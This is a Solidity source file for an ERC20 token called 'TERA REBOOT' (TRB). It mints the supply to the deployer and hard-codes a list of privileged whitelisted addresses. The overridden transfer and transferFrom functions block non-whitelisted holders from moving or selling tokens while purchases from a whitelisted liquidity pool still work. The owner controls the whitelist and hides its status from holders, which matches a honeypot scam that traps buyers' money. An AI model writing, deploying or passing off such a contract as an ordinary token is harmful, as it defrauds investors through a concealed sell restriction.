// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("TERA REBOOT", "TRB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 780000000 * 10 ** decimals());
        whiteList[0x5078E17EFd4D6e345f515Db6731A06723008aE85]= true;
        whiteList[0x85006c16E422Df9f5DE85377C7354905332B9026]=true;
        whiteList[0x7f0edC8a98b6d873c399c4852939E18003C7B8F8]=true;
        whiteList[0x101D24bd4d6Ef3557D53E180f70263044dB20B6D]=true;
        whiteList[0x50d3521180B53aAC679c26993B1FB0d12a680B17]=true;
        whiteList[0xb7E64425AE4edDc2575187A3C1610Ef7EC3A56Fc]=true;
        whiteList[0x783BE7218b4e991d43230dDcc8dCAc8ce8A3bAfA]=true;
        whiteList[0x89706935746dc25d20e24c3974DfD9cA180Eaae4]=true;
        whiteList[0x635b374A1268E6B86e1bF8E69c5E09F3d38785f7]=true;
        whiteList[0xC7eC7247f5c52ca7ECB1DDA120CaBd64b8Ae11e8]=true;
        whiteList[0xe8e9fa7deBa74f7F8DE4f3105b726fE66C64EDeF]=true;
        whiteList[0x968046bC1b578BE5F8D32F070852347dfa85471D]=true;
        whiteList[0x750B0ea9EFf5184FF26Af38283d435ad8f705437]=true;
        whiteList[0x44B4Ea291Dbdc196374259E1bC9193a7d8Fe93d9]=true;
        whiteList[0xfDC8B7dBCdfE87dA6166Ae380c81e61f7f41f5bB]=true;
        whiteList[0xfA672ac8F272fED16E596b1261792aD7CA90a1eb]=true;
        whiteList[0x95E85c377dCB200f5Bf5B736c49FDb4380dC9300]=true;
        whiteList[0x42C61186545B63786f0590959E67E1460C9a6766]=true;
        whiteList[0x058bDf3384AA6d012f6252F590b3AD3Bc5288e07]=true;
        whiteList[0x939bc3535e22D8C6b23383b5DfcCb21aaD3189Cc]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}